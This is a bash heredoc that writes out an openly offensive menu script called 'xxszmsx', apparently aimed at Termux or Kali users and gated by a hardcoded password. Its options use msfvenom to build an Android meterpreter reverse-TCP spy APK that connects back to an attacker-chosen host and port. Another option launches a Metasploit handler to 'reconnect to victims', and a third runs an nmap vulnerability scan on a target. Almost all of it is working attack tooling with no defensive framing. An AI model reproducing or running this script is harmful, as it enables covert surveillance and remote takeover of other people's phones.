cat << 'EOF' > xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: STUDIO | xxszmsx
# MADE FOR ARABS BY: STUDIO
# VERSION: 7.0 (GLOBAL EDITION)
# =====================================================

RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'

# System Detection
if [[ -d "/data/data/com.termux/files/usr/bin" ]]; then
    OS="TERMUX"; SAVE_PATH="/sdcard/studio_spy.apk"; DB_FILE="$HOME/.studio_data"
else
    OS="KALI-LINUX"; SAVE_PATH="$(pwd)/studio_spy.apk"; DB_FILE=".studio_data"
fi

save_cfg() { echo "$1:$2" > "$DB_FILE"; }
load_cfg() { if [ -f "$DB_FILE" ]; then cat "$DB_FILE"; fi; }

clear
echo -e "${RED}====================================================="
echo -e "         MADE FOR ARABS BY STUDIO | xxszmsx          "
echo -e "=====================================================${NC}"
read -s -p "[?] Security Password: " p; echo ""
if [ "$p" != "mazen2014" ]; then echo "Access Denied!"; exit 1; fi

while true; do
    clear
    echo -e "${RED}"
    echo "  ██████╗████████╗██╗   ██╗██████╗ ██╗ ██████╗ "
    echo " ██╔════╝╚══██╔══╝██║   ██║██╔══██╗██║██╔═══██╗"
    echo " ╚█████╗    ██║   ██║   ██║██║  ██║██║██║   ██║"
    echo "  ╚═══██╗   ██║   ██║   ██║██║  ██║██║██║   ██║"
    echo " ██████╔╝   ██║   ╚██████╔╝██████╔╝██║╚██████╔╝"
    echo " ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ ╚═╝ ╚═════╝ "
    echo -e "${YELLOW}      [ STUDIO | xxszmsx ] - [ MADE BY ARABS ]${NC}"
    echo "-----------------------------------------------------"
    echo -e "1) Build Spy App (Android Payload)"
    echo -e "2) Web Vulnerability Scanner (Nmap)"
    echo -e "3) Open Controller (Active Listeners)"
    echo -e "4) Edit Tool Code"
    echo -e "0) Exit Program"
    echo "-----------------------------------------------------"
    read -p "Studio >> " choice
    case $choice in
        1) read -p "Enter LHOST (IP): " lh; read -p "Enter LPORT: " lp; save_cfg "$lh" "$lp"
           echo -e "${RED}[*] Building studio_spy.apk...${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "$SAVE_PATH"
           echo -e "${GREEN}[+] Success! Saved to: $SAVE_PATH${NC}" ;;
        2) read -p "Target URL: " t_url; nmap -sV --script=vuln "$t_url" ;;
        3) cfg=$(load_cfg); IP=$(echo $cfg | cut -d: -f1); PORT=$(echo $cfg | cut -d: -f2)
           echo -e "${GREEN}[*] Re-connecting to victims on $IP:$PORT...${NC}"
           msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; set ExitOnSession false; exploit -j" ;;
        4) nano xxszmsx.sh ;;
        0) exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
done
EOF
